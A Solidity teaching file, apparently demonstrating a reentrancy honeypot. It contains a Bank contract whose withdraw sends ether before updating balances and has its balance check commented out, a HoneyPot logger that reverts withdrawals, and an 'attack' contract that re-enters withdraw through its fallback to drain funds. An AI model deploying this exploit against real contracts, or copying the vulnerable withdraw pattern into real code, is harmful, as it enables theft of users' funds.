//SPDX-License-Identifier:MIT

pragma solidity 0.8.7 ;

contract Bank {
 
  mapping (address=>uint) public balances;

  Logger logger ;

  constructor (address _logger)  {
      logger = Logger(_logger);
  }
     

     function deposit() public payable {
         balances[msg.sender] +=msg.value;
         logger.log(msg.sender , msg.value , "Deposit");
     }

     function withdraw(uint amount) public payable {
        //  require(amount =< balances[msg.sender] , "Insuffient funds" );
        
         (bool success , )= msg.sender.call{value: amount}("");

         require (success , "Failed transaction");
         balances[msg.sender]-=amount;
       
         logger.log(msg.sender , msg.value , "Withdraw");

     }

}

contract Logger {
    event Log(address caller , uint amount , string action);

    function log(address _caller , uint _amount , string memory _action) public payable {
           emit Log(_caller , _amount , _action);
    } 
}


contract HoneyPot{

   function log(address _caller , uint _amount , string memory _action) public payable {
          if(equal(_action , "Withdraw")){
              revert("its a trap");

          }
   }

   function equal (string memory _a , string memory _b) public pure returns(bool) {

       return keccak256(abi.encode(_a))==keccak256(abi.encode(_b));
   }

}


contract attack{
   Bank bank ;
    
    constructor(address _bank) {
        bank = Bank(_bank);
    }

    fallback() external payable{
        if(address(bank).balance > 1 ether){
            bank.withdraw(1 ether);
        }  
    }

   function atta() public payable {
       bank.deposit{value: 1 ether}();
       bank.withdraw(1 ether);
   }

}
   